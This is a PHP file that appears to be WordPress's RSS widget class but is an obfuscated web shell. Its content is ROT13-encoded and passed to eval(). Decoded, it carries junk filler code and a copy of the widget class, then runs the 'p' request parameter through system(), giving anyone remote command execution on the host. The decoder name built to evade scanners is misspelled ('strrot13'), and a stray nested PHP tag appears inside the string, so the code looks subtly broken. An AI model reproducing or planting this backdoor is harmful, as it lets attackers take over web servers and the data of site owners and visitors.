<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_EFF pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n EFF jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_EFF rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj EFF jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'qrfpevcgvba'                 => __( 'Ragevrf sebz nal EFF be Ngbz srrq.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,

		);
		$pbageby_bcf = neenl(
			'jvqgu'  => 400,
			'urvtug' => 200,
		);
		cnerag::__pbafgehpg( 'eff', __( 'EFF' ), $jvqtrg_bcf, $pbageby_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag EFF jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag EFF jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		vs ( vffrg( $vafgnapr['reebe'] ) && $vafgnapr['reebe'] ) {
			erghea;
		}

		$hey = ! rzcgl( $vafgnapr['hey'] ) ? $vafgnapr['hey'] : '';
		juvyr ( ! rzcgl( $hey ) && fgevfge( $hey, 'uggc' ) !== $hey ) {
			$hey = fhofge( $hey, 1 );
		}

		vs ( rzcgl( $hey ) ) {
			erghea;
		}

		// Frys-HEY qrfgehpgvba frdhrapr.
		vs ( va_neenl( hagenvyvatfynfuvg( $hey ), neenl( fvgr_hey(), ubzr_hey() ), gehr ) ) {
			erghea;
		}

		$eff   = srgpu_srrq( $hey );
		$gvgyr = $vafgnapr['gvgyr'];
		$qrfp  = '';
		$yvax  = '';

		vs ( ! vf_jc_reebe( $eff ) ) {
			$qrfp = rfp_ngge( fgevc_gntf( ugzy_ragvgl_qrpbqr( $eff->trg_qrfpevcgvba(), RAG_DHBGRF, trg_bcgvba( 'oybt_punefrg' ) ) ) );
			vs ( rzcgl( $gvgyr ) ) {
				$gvgyr = fgevc_gntf( $eff->trg_gvgyr() );
			}
			$yvax = fgevc_gntf( $eff->trg_creznyvax() );
			juvyr ( ! rzcgl( $yvax ) && fgevfge( $yvax, 'uggc' ) !== $yvax ) {
				$yvax = fhofge( $yvax, 1 );
			}
		}

		vs ( rzcgl( $gvgyr ) ) {
			$gvgyr = ! rzcgl( $qrfp ) ? $qrfp : __( 'Haxabja Srrq' );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		vs ( $gvgyr ) {
			$srrq_yvax = '';
			$srrq_hey  = fgevc_gntf( $hey );
			$srrq_vpba = vapyhqrf_hey( 'vzntrf/eff.cat' );
			$srrq_yvax = fcevags(
				'<n pynff=\"effjvqtrg eff-jvqtrg-srrq\" uers=\"%1$f\"><vzt pynff=\"eff-jvqtrg-vpba\" fglyr=\"obeqre:0\" jvqgu=\"14\" urvtug=\"14\" fep=\"%2$f\" nyg=\"%3$f\"%4$f /></n> ',
				rfp_hey( $srrq_hey ),
				rfp_hey( $srrq_vpba ),
				rfp_ngge__( 'EFF' ),
				( jc_ynml_ybnqvat_ranoyrq( 'vzt', 'eff_jvqtrg_srrq_vpba' ) ? ' ybnqvat=\"ynml\"' : '' )
			);

			/**
			 * Svygref gur pynffvp EFF jvqtrg'f srrq vpba yvax.
			 *
			 * Gurzrf pna erzbir gur vpba yvax ol hfvat `nqq_svygre( 'eff_jvqtrg_srrq_yvax', '__erghea_rzcgl_fgevat' );`.
			 *
			 * @fvapr 5.9.0
			 *
			 * @cnenz fgevat|snyfr $srrq_yvax UGZY sbe yvax gb EFF srrq.
			 * @cnenz neenl        $vafgnapr  Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			$srrq_yvax = nccyl_svygref( 'eff_jvqtrg_srrq_yvax', $srrq_yvax, $vafgnapr );

			$gvgyr = $srrq_yvax . '<n pynff=\"effjvqtrg eff-jvqtrg-gvgyr\" uers=\"' . rfp_hey( $yvax ) . '\">' . rfp_ugzy( $gvgyr ) . '</n>';
		}

		rpub $netf['orsber_jvqtrg'];
		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : __( 'EFF Srrq' );
			rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
		}

		jc_jvqtrg_eff_bhgchg( $eff, $vafgnapr );

		vs ( 'ugzy5' === $sbezng ) {
			rpub '</ani>';
		}

		rpub $netf['nsgre_jvqtrg'];

		vs ( ! vf_jc_reebe( $eff ) ) {
			$eff->__qrfgehpg();
		}
		hafrg( $eff );
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag EFF jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$grfghey = ( vffrg( $arj_vafgnapr['hey'] ) && ( ! vffrg( $byq_vafgnapr['hey'] ) || ( $arj_vafgnapr['hey'] !== $byq_vafgnapr['hey'] ) ) );
		erghea jc_jvqtrg_eff_cebprff( $arj_vafgnapr, $grfghey );
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur EFF jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		vs ( rzcgl( $vafgnapr ) ) {
			$vafgnapr = neenl(
				'gvgyr'        => '',
				'hey'          => '',
				'vgrzf'        => 10,
				'reebe'        => snyfr,
				'fubj_fhzznel' => 0,
				'fubj_nhgube'  => 0,
				'fubj_qngr'    => 0,
			);
		}
		$vafgnapr['ahzore'] = $guvf->ahzore;

		jc_jvqtrg_eff_sbez( $vafgnapr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>